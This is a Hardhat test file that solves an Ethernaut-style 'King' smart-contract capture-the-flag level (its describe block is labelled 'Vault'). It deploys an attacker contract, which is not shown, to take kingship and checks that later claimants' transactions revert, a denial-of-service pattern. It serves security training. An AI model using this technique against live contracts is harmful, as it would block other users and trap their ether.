const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

*/

describe("[Challenge] Vault", function () {
  let deployer, attacker, normalUser;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker, normalUser] = await ethers.getSigners();

    this.king = await (
      await ethers.getContractFactory("King", deployer)
    ).deploy({ value: ethers.utils.parseEther("0.1") });
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    this.kingAttack = await (
      await ethers.getContractFactory("KingAttack", attacker)
    ).deploy(this.king.address);

    await this.kingAttack
      .connect(attacker)
      .attack({ value: ethers.utils.parseEther("0.2") });

    const currentKing = await this.king._king();
    expect(currentKing).to.eq(this.kingAttack.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // new challenger fail to claim kingship because attacker contract reverted
    await expect(
      normalUser.sendTransaction({
        to: this.king.address,
        value: ethers.utils.parseEther("0.3"),
      })
    ).to.be.reverted;

    const currentKing = await this.king._king();
    expect(currentKing).to.eq(this.kingAttack.address);
  });
});
